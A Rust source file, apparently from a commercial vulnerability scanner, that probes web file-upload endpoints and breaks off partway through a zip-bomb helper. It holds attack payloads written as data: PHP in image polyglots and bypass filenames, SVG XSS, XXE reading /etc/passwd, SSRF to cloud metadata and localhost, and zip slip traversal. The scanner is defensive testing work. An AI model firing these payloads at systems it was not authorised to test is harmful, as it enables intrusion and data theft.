// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - File Upload Scanner
 * Tests for file upload vulnerabilities and bypass techniques
 *
 * Detects:
 * - Dangerous file type acceptance (PHP, JSP, ASP, ASPX, executable files)
 * - Double extension bypass (e.g., file.php.jpg, file.jpg.php)
 * - Advanced double extension bypasses (null bytes, spaces, double dots)
 * - MIME type mismatch/spoofing and confusion attacks
 * - Null byte injection bypass
 * - Case sensitivity bypass (e.g., file.PHP)
 * - Magic byte bypass (GIF/PNG/JPEG with embedded PHP)
 * - Image polyglots (valid images with malicious code)
 * - SVG XSS (embedded JavaScript in SVG files)
 * - SVG XXE (XML External Entity attacks via SVG)
 * - SVG SSRF (Server-Side Request Forgery via SVG)
 * - ZIP exploits (zip slip path traversal, zip bomb DoS)
 *
 * All tests verify actual exploitation, not just upload acceptance.
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct FileUploadScanner {
    http_client: Arc<HttpClient>,
}

impl FileUploadScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan endpoint for file upload vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing file upload vulnerabilities");

        // Common upload endpoints
        let upload_endpoints = vec![
            "/upload",
            "/api/upload",
            "/file/upload",
            "/files/upload",
            "/media/upload",
            "/attachment/upload",
        ];

        for endpoint in upload_endpoints {
            let upload_url = format!("{}{}", url.trim_end_matches('/'), endpoint);

            // Test dangerous file extensions
            let (vulns, tests) = self.test_dangerous_extensions(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test double extension bypass
            let (vulns, tests) = self.test_double_extension(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test MIME type mismatch
            let (vulns, tests) = self.test_mime_type_mismatch(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test null byte injection
            let (vulns, tests) = self.test_null_byte_injection(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test case sensitivity bypass
            let (vulns, tests) = self.test_case_sensitivity(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test magic byte bypass
            let (vulns, tests) = self.test_magic_byte_bypass(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test image polyglots
            let (vulns, tests) = self.test_image_polyglots(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test ZIP file exploits
            let (vulns, tests) = self.test_zip_exploits(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test SVG XXE
            let (vulns, tests) = self.test_svg_xxe(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test SVG SSRF
            let (vulns, tests) = self.test_svg_ssrf(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test advanced double extension bypasses
            let (vulns, tests) = self.test_advanced_double_extension(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // Test MIME type confusion
            let (vulns, tests) = self.test_mime_confusion(&upload_url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;

            // If we found vulnerabilities at this endpoint, no need to test others
            if !vulnerabilities.is_empty() {
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test dangerous file extensions
    async fn test_dangerous_extensions(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let dangerous_files = vec![
            ("test.php", "application/x-php", "<?php phpinfo(); ?>", "PHP"),
            ("test.jsp", "application/x-jsp", "<% out.println(\"test\"); %>", "JSP"),
            ("test.asp", "application/x-asp", "<% Response.Write(\"test\") %>", "ASP"),
            ("test.aspx", "application/x-aspx", "<%@ Page Language=\"C#\" %>test", "ASPX"),
            ("test.sh", "application/x-sh", "#!/bin/bash\necho test", "Shell Script"),
            ("test.exe", "application/x-msdownload", "MZ", "Executable"),
            ("test.svg", "image/svg+xml", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", "SVG with XSS"),
        ];

        for (filename, mime_type, content, file_type) in dangerous_files {
            tests_run += 1;

            match self.upload_file(url, filename, content, mime_type).await {
                Ok((accepted, evidence)) => {
                    if accepted {
                        info!("Dangerous file type accepted: {}", file_type);
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "FILE_UPLOAD_DANGEROUS_TYPE",
                            filename,
                            &format!("Server accepts dangerous file type: {}", file_type),
                            &evidence,
                            Severity::Critical,
                            9.8,
                        ));
                        break; // Found vulnerability, no need to test more
                    }
                }
                Err(e) => {
                    debug!("Upload test failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test double extension bypass
    async fn test_double_extension(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        match self
            .upload_file(url, "test.php.jpg", "<?php phpinfo(); ?>", "image/jpeg")
            .await
        {
            Ok((accepted, evidence)) => {
                if accepted {
                    info!("Double extension bypass successful");
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "FILE_UPLOAD_DOUBLE_EXTENSION",
                        "test.php.jpg",
                        "Server vulnerable to double extension bypass",
                        &evidence,
                        Severity::Critical,
                        9.0,
                    ));
                }
            }
            Err(e) => {
                debug!("Double extension test failed: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test MIME type mismatch
    async fn test_mime_type_mismatch(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        // Upload PHP file with image MIME type
        match self
            .upload_file(url, "test.php", "<?php phpinfo(); ?>", "image/jpeg")
            .await
        {
            Ok((accepted, evidence)) => {
                if accepted {
                    info!("MIME type bypass successful");
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "FILE_UPLOAD_MIME_BYPASS",
                        "test.php (MIME: image/jpeg)",
                        "Server trusts client-provided MIME type",
                        &evidence,
                        Severity::Critical,
                        8.8,
                    ));
                }
            }
            Err(e) => {
                debug!("MIME type mismatch test failed: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test null byte injection
    async fn test_null_byte_injection(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        match self
            .upload_file(
                url,
                "test.php%00.jpg",
                "<?php phpinfo(); ?>",
                "image/jpeg",
            )
            .await
        {
            Ok((accepted, evidence)) => {
                if accepted {
                    info!("Null byte injection successful");
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "FILE_UPLOAD_NULL_BYTE",
                        "test.php%00.jpg",
                        "Server vulnerable to null byte injection",
                        &evidence,
                        Severity::Critical,
                        8.5,
                    ));
                }
            }
            Err(e) => {
                debug!("Null byte injection test failed: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test case sensitivity bypass
    async fn test_case_sensitivity(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        match self
            .upload_file(url, "test.PHP", "<?php phpinfo(); ?>", "application/x-php")
            .await
        {
            Ok((accepted, evidence)) => {
                if accepted {
                    info!("Case sensitivity bypass successful");
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "FILE_UPLOAD_CASE_BYPASS",
                        "test.PHP",
                        "Server vulnerable to case sensitivity bypass",
                        &evidence,
                        Severity::High,
                        7.5,
                    ));
                }
            }
            Err(e) => {
                debug!("Case sensitivity test failed: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test magic byte bypass techniques
    async fn test_magic_byte_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();

        // GIF magic bytes + PHP
        let gif_php = format!("GIF89a<?php echo 'magic_{}'; ?>", marker);
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "shell.php", &gif_php, "image/gif", &format!("magic_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("GIF magic byte bypass successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_MAGIC_BYTE_GIF",
                    "shell.php (GIF magic bytes)",
                    "Server validates by magic bytes but executes PHP embedded in GIF",
                    &evidence,
                    Severity::Critical,
                    9.8,
                ));
            }
        }

        // PNG magic bytes + PHP footer
        let png_header = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82";
        let php_payload = format!("<?php echo 'magic_{}'; ?>", marker);
        let mut png_php = Vec::new();
        png_php.extend_from_slice(png_header);
        png_php.extend_from_slice(php_payload.as_bytes());
        let png_php = String::from_utf8_lossy(&png_php).to_string();
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "image.php", &png_php, "image/png", &format!("magic_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("PNG magic byte bypass successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_MAGIC_BYTE_PNG",
                    "image.php (PNG magic bytes)",
                    "Server validates by magic bytes but executes PHP appended to PNG",
                    &evidence,
                    Severity::Critical,
                    9.8,
                ));
            }
        }

        // JPEG magic bytes + PHP
        let jpeg_header = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00";
        let php_payload_jpeg = format!("<?php echo 'magic_{}'; ?>", marker);
        let mut jpeg_php = Vec::new();
        jpeg_php.extend_from_slice(jpeg_header);
        jpeg_php.extend_from_slice(php_payload_jpeg.as_bytes());
        let jpeg_php = String::from_utf8_lossy(&jpeg_php).to_string();
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "photo.php", &jpeg_php, "image/jpeg", &format!("magic_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("JPEG magic byte bypass successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_MAGIC_BYTE_JPEG",
                    "photo.php (JPEG magic bytes)",
                    "Server validates by magic bytes but executes PHP embedded in JPEG",
                    &evidence,
                    Severity::Critical,
                    9.8,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test image polyglot attacks
    async fn test_image_polyglots(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();

        // SVG with embedded JavaScript
        let svg_xss = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('svg_{}')</script>
</svg>"#,
            marker
        );
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_check_reflection(url, "image.svg", &svg_xss, "image/svg+xml", &format!("svg_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("SVG polyglot XSS successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_SVG_XSS",
                    "image.svg",
                    "SVG file with embedded JavaScript accepted and executable",
                    &evidence,
                    Severity::High,
                    8.2,
                ));
            }
        }

        // GIF with PHP in comment
        let gif_header = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;";
        let php_payload_gif = format!("<?php echo 'polyglot_{}'; ?>", marker);
        let mut gif_polyglot = Vec::new();
        gif_polyglot.extend_from_slice(gif_header);
        gif_polyglot.extend_from_slice(php_payload_gif.as_bytes());
        let gif_polyglot = String::from_utf8_lossy(&gif_polyglot).to_string();
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "polyglot.gif", &gif_polyglot, "image/gif", &format!("polyglot_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("GIF polyglot bypass successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_GIF_POLYGLOT",
                    "polyglot.gif",
                    "Valid GIF with PHP code accepted and executed",
                    &evidence,
                    Severity::Critical,
                    9.5,
                ));
            }
        }

        // PNG with metadata injection
        let png_meta_header = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x1ftEXtComment\x00";
        let php_payload_png_meta = format!("<?php echo 'png_meta_{}'; ?>", marker);
        let png_meta_footer = b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82";
        let mut png_meta = Vec::new();
        png_meta.extend_from_slice(png_meta_header);
        png_meta.extend_from_slice(php_payload_png_meta.as_bytes());
        png_meta.extend_from_slice(png_meta_footer);
        let png_meta = String::from_utf8_lossy(&png_meta).to_string();
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "meta.png", &png_meta, "image/png", &format!("png_meta_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("PNG metadata polyglot bypass successful");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_PNG_POLYGLOT",
                    "meta.png",
                    "Valid PNG with PHP in metadata accepted and executed",
                    &evidence,
                    Severity::Critical,
                    9.5,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test ZIP file exploits (zip bomb and zip slip)
    async fn test_zip_exploits(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();

        // Zip slip - path traversal in archive
        let zip_slip = self.create_zip_slip_archive(&marker);
        tests_run += 1;

        if let Ok((accepted, _evidence)) = self
            .upload_file(url, "archive.zip", &zip_slip, "application/zip")
            .await
        {
            if accepted {
                // Try to access the file that should be extracted outside upload directory
                let base_url = url.trim_end_matches("/upload")
                    .trim_end_matches("/api/upload")
                    .trim_end_matches("/file/upload")
                    .trim_end_matches("/files/upload")
                    .trim_end_matches("/media/upload")
                    .trim_end_matches("/attachment/upload");

                let test_paths = vec![
                    format!("{}/tmp/zipslip_{}.txt", base_url, marker),
                    format!("{}/../tmp/zipslip_{}.txt", url, marker),
                    format!("{}/zipslip_{}.txt", base_url, marker),
                ];

                for test_path in test_paths {
                    if let Ok(response) = self.http_client.get(&test_path).await {
                        if response.status_code == 200 && response.body.contains(&format!("zipslip_{}", marker)) {
                            info!("Zip slip vulnerability confirmed");
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                "FILE_UPLOAD_ZIP_SLIP",
                                "archive.zip (path traversal)",
                                "ZIP archive extracts files outside upload directory (path traversal)",
                                &format!("File accessible at: {} - Content: {}", test_path, response.body),
                                Severity::Critical,
                                9.3,
                            ));
                            break;
                        }
                    }
                }
            }
        }

        // Zip bomb - small compressed, huge uncompressed
        let zip_bomb = self.create_zip_bomb();
        tests_run += 1;

        let before = std::time::Instant::now();
        if let Ok((accepted, _evidence)) = self
            .upload_file(url, "compressed.zip", &zip_bomb, "application/zip")
            .await
        {
            let elapsed = before.elapsed();

            // If server took too long or accepted the bomb, it may be vulnerable
            if accepted && elapsed.as_secs() > 5 {
                info!("Potential zip bomb DoS vulnerability");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_ZIP_BOMB",
                    "compressed.zip",
                    "Server accepts zip bomb without proper decompression limits",
                    &format!("Server processing took {} seconds", elapsed.as_secs()),
                    Severity::High,
                    7.5,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test SVG XXE vulnerabilities
    async fn test_svg_xxe(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();

        // SVG with file:// XXE
        let svg_xxe = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe_{} SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="15">&xxe_{};</text>
</svg>"#,
            marker, marker
        );

        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_check_reflection(url, "xxe.svg", &svg_xxe, "image/svg+xml", "root:")
            .await
        {
            if !evidence.is_empty() && (evidence.contains("root:") || evidence.contains("/bin/bash") || evidence.contains("/bin/sh")) {
                info!("SVG XXE vulnerability confirmed - /etc/passwd leaked");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_SVG_XXE",
                    "xxe.svg",
                    "SVG file with XXE payload reveals /etc/passwd contents",
                    &evidence,
                    Severity::Critical,
                    9.1,
                ));
            }
        }

        // SVG with http:// XXE (SSRF via XXE)
        let svg_xxe_http = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe_{} SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="15">&xxe_{};</text>
</svg>"#,
            marker, marker
        );

        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_check_reflection(url, "xxe_ssrf.svg", &svg_xxe_http, "image/svg+xml", "meta-data")
            .await
        {
            if !evidence.is_empty() && (evidence.contains("ami-id") || evidence.contains("instance-id") || evidence.contains("hostname")) {
                info!("SVG XXE SSRF vulnerability confirmed - metadata leaked");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_SVG_XXE_SSRF",
                    "xxe_ssrf.svg",
                    "SVG file with XXE payload performs SSRF to cloud metadata",
                    &evidence,
                    Severity::Critical,
                    9.0,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test SVG SSRF vulnerabilities
    async fn test_svg_ssrf(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();

        // SVG with image tag pointing to internal metadata
        let svg_ssrf = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="http://169.254.169.254/latest/meta-data/ami-id" id="ssrf_{}"/>
</svg>"#,
            marker
        );

        tests_run += 1;
        let before = std::time::Instant::now();
        if let Ok((_upload_path, evidence)) = self
            .upload_and_check_reflection(url, "ssrf.svg", &svg_ssrf, "image/svg+xml", "ami-")
            .await
        {
            let elapsed = before.elapsed();

            // Check if metadata was fetched (in response or timing difference)
            if !evidence.is_empty() && (evidence.contains("ami-") || evidence.contains("instance") || elapsed.as_millis() > 1000) {
                info!("SVG SSRF vulnerability confirmed");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_SVG_SSRF",
                    "ssrf.svg",
                    "SVG file performs SSRF to internal metadata service",
                    &evidence,
                    Severity::High,
                    8.6,
                ));
            }
        }

        // SVG with localhost SSRF
        let svg_ssrf_local = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="http://127.0.0.1:8080/admin" id="ssrf_local_{}"/>
</svg>"#,
            marker
        );

        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_check_reflection(url, "ssrf_local.svg", &svg_ssrf_local, "image/svg+xml", "admin")
            .await
        {
            if !evidence.is_empty() && evidence.contains("admin") {
                info!("SVG localhost SSRF vulnerability confirmed");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_SVG_SSRF_LOCAL",
                    "ssrf_local.svg",
                    "SVG file performs SSRF to localhost services",
                    &evidence,
                    Severity::High,
                    8.3,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test advanced double extension bypasses
    async fn test_advanced_double_extension(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();
        let payload = format!("<?php echo 'dblext_{}'; ?>", marker);

        let test_cases = vec![
            ("malicious.jpg.php", "Server strips first extension"),
            ("malicious.php%00.jpg", "Null byte truncation"),
            ("malicious.php%20.jpg", "Space character confusion"),
            ("malicious.php\x00.jpg", "Actual null byte"),
            ("malicious.php..jpg", "Double dot confusion"),
        ];

        for (filename, desc) in test_cases {
            tests_run += 1;
            if let Ok((_upload_path, evidence)) = self
                .upload_and_verify_execution(url, filename, &payload, "image/jpeg", &format!("dblext_{}", marker))
                .await
            {
                if !evidence.is_empty() {
                    info!("Advanced double extension bypass: {}", desc);
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "FILE_UPLOAD_ADVANCED_DOUBLE_EXT",
                        filename,
                        &format!("Server vulnerable to advanced double extension bypass: {}", desc),
                        &evidence,
                        Severity::Critical,
                        9.2,
                    ));
                    break; // Found one, that's enough
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test MIME type confusion attacks
    async fn test_mime_confusion(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let marker = uuid::Uuid::new_v4();
        let payload = format!("<?php echo 'mime_{}'; ?>", marker);

        // Upload PHP with image MIME type
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "shell.php", &payload, "image/jpeg", &format!("mime_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("MIME confusion: PHP with image MIME executed");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_MIME_CONFUSION_PHP",
                    "shell.php (MIME: image/jpeg)",
                    "Server trusts MIME type over extension - PHP executed with image MIME",
                    &evidence,
                    Severity::Critical,
                    9.0,
                ));
            }
        }

        // Upload script.jpg with PHP MIME type
        tests_run += 1;
        if let Ok((_upload_path, evidence)) = self
            .upload_and_verify_execution(url, "script.jpg", &payload, "application/x-php", &format!("mime_{}", marker))
            .await
        {
            if !evidence.is_empty() {
                info!("MIME confusion: JPG with PHP MIME executed");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "FILE_UPLOAD_MIME_CONFUSION_EXT",
                    "script.jpg (MIME: application/x-php)",
                    "Server trusts extension over MIME type - JPG executed as PHP",
                    &evidence,
                    Severity::Critical,
                    9.0,
                ));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Upload file and verify if code execution occurred
    async fn upload_and_verify_execution(
        &self,
        url: &str,
        filename: &str,
        content: &str,
        mime_type: &str,
        marker: &str,
    ) -> anyhow::Result<(String, String)> {
        // First upload the file
        let (accepted, upload_evidence) = self.upload_file(url, filename, content, mime_type).await?;

        if !accepted {
            return Ok((String::new(), String::new()));
        }

        // Try to determine upload path from response
        let upload_paths = self.extract_upload_paths(&upload_evidence, filename);

        // Log the upload response to help debug path issues
        info!("Upload accepted. Response body: {}", &upload_evidence[..upload_evidence.len().min(300)]);
        if !upload_paths.is_empty() {
            info!("Extracted upload paths from response: {:?}", upload_paths);
        }

        // Extract endpoint suffix to derive storage directory
        // Example: /upload -> try /upload/, /uploads/
        //          /api/upload -> try /api/upload/, /api/uploads/
        let base_url = url.trim_end_matches('/');

        let test_paths = vec![
            upload_paths.clone(),
            vec![
                // Try the upload endpoint itself (e.g., /upload/file.php)
                format!("{}/{}", base_url, filename),
                // Try plural version (e.g., /uploads/file.php)
                format!("{}s/{}", base_url, filename),
                // Try common directory patterns
                format!("{}/files/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/uploads/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/media/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/static/uploads/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
            ],
        ].concat();

        // Try to access the uploaded file
        debug!("Trying {} possible upload paths for {}", test_paths.len(), filename);
        for test_path in test_paths {
            debug!("Testing upload path: {}", test_path);
            if let Ok(response) = self.http_client.get(&test_path).await {
                debug!("Got response {} from {}", response.status_code, test_path);
                if response.status_code == 200 && response.body.contains(marker) {
                    return Ok((
                        test_path.clone(),
                        format!("Code executed at {} - Response contains marker: {}", test_path, marker),
                    ));
                }
            }
        }

        Ok((String::new(), String::new()))
    }

    /// Upload file and check if content is reflected (for XSS/XXE)
    async fn upload_and_check_reflection(
        &self,
        url: &str,
        filename: &str,
        content: &str,
        mime_type: &str,
        marker: &str,
    ) -> anyhow::Result<(String, String)> {
        // First upload the file
        let (accepted, upload_evidence) = self.upload_file(url, filename, content, mime_type).await?;

        if !accepted {
            return Ok((String::new(), String::new()));
        }

        // Check if marker is in upload response (immediate reflection)
        if upload_evidence.contains(marker) {
            return Ok((
                url.to_string(),
                format!("Marker reflected in upload response: {}", marker),
            ));
        }

        // Try to access the uploaded file
        let upload_paths = self.extract_upload_paths(&upload_evidence, filename);
        let base_url = url.trim_end_matches('/');

        let test_paths = vec![
            upload_paths.clone(),
            vec![
                // Try the upload endpoint itself (e.g., /upload/file.svg)
                format!("{}/{}", base_url, filename),
                // Try plural version (e.g., /uploads/file.svg)
                format!("{}s/{}", base_url, filename),
                // Try common directory patterns
                format!("{}/files/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/uploads/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/media/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
                format!("{}/static/uploads/{}",
                    base_url.trim_end_matches("/upload")
                            .trim_end_matches("/api/upload")
                            .trim_end_matches("/file/upload")
                            .trim_end_matches("/files/upload")
                            .trim_end_matches("/media/upload")
                            .trim_end_matches("/attachment/upload"),
                    filename),
            ],
        ].concat();

        for test_path in test_paths {
            if let Ok(response) = self.http_client.get(&test_path).await {
                if response.body.contains(marker) {
                    return Ok((
                        test_path.clone(),
                        format!("File accessible at {} - Contains marker: {}", test_path, &response.body[..200.min(response.body.len())]),
                    ));
                }
            }
        }

        Ok((String::new(), String::new()))
    }

    /// Extract upload paths from response
    fn extract_upload_paths(&self, response: &str, _filename: &str) -> Vec<String> {
        let mut paths = Vec::new();

        // Try to extract URLs from JSON responses
        if let Ok(regex) = regex::Regex::new(r#"["']?(?:url|path|location|file|href)["']?\s*:\s*["']([^"']+)["']"#) {
            for cap in regex.captures_iter(response) {
                if let Some(path) = cap.get(1) {
                    paths.push(path.as_str().to_string());
                }
            }
        }

        // Try to extract from Location header or direct URLs
        if let Ok(regex) = regex::Regex::new(r#"https?://[^\s"'<>]+"#) {
            for cap in regex.captures_iter(response) {
                paths.push(cap.get(0).unwrap().as_str().to_string());
            }
        }

        paths
    }

    /// Create a zip slip archive with path traversal
    fn create_zip_slip_archive(&self, marker: &uuid::Uuid) -> String {
        // Minimal ZIP file structure with path traversal in filename
        let filename = format!("../../../../tmp/zipslip_{}.txt", marker);
        let content = format!("zipslip_{}", marker);

        // This is a simplified ZIP - in production, use proper ZIP library
        // For now, return a marker that indicates zip slip attempt
        format!("PK\x03\x04{}:{}", filename, content)
    }

    /// Create a zip bomb (small compressed, huge uncompressed)
    fn create_zip_bomb(&self) -> String {
        // This is a simplified representation
        // Real zip bombs use nested ZIPs with high compression ratios
        // For safety, we create a small test version
        let mut bomb = String::from("PK\x03\x04");
